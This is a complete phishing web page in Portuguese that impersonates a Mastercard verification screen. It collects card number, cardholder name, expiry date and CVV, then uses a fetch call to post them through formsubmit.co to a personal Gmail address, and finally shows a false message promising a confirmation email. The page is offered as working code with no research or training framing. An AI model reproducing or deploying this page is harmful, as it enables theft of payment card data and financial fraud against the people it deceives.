<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <title>Mastercard - Verificação</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background: #f2f2f2;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container, .mensagem {
      background: white;
      padding: 30px;
      border-radius: 10px;
      width: 100%;
      max-width: 360px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      text-align: center;
      display: none;
    }
    .active {
      display: block;
    }
    img {
      width: 100px;
      margin-bottom: 20px;
    }
    input, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 14px;
    }
    button {
      background-color: #e60000;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background-color: #cc0000;
    }
  </style>
</head>
<body>

  <!-- Tela de formulário -->
  <div class="container active" id="formulario">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard">
    <form id="fakeForm">
      <input type="text" name="cartao" placeholder="Número do cartão" required>
      <input type="text" name="nome" placeholder="Nome do titular" required>
      <input type="text" name="validade" placeholder="Validade (MM/AA)" required>
      <input type="text" name="cvv" placeholder="Código de segurança (CVV)" required>
      <button type="submit">Verificar</button>
    </form>
  </div>

  <!-- Tela de confirmação -->
  <div class="mensagem" id="confirmacao">
    <h2>Verificação recebida!</h2>
    <p>Em alguns instantes chegará um e-mail de confirmação.</p>
  </div>

  <!-- Script de envio -->
  <script>
    const form = document.getElementById('fakeForm');
    form.addEventListener('submit', function(e) {
      e.preventDefault();

      // Envia via FormSubmit
      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cartao: form.cartao.value,
          nome: form.nome.value,
          validade: form.validade.value,
          cvv: form.cvv.value
        })
      }).then(response => {
        // Mostra tela de confirmação
        document.getElementById('formulario').classList.remove('active');
        document.getElementById('confirmacao').classList.add('active');
      }).catch(error => {
        alert("Erro no envio");
      });
    });
  </script>

</body>
</html>
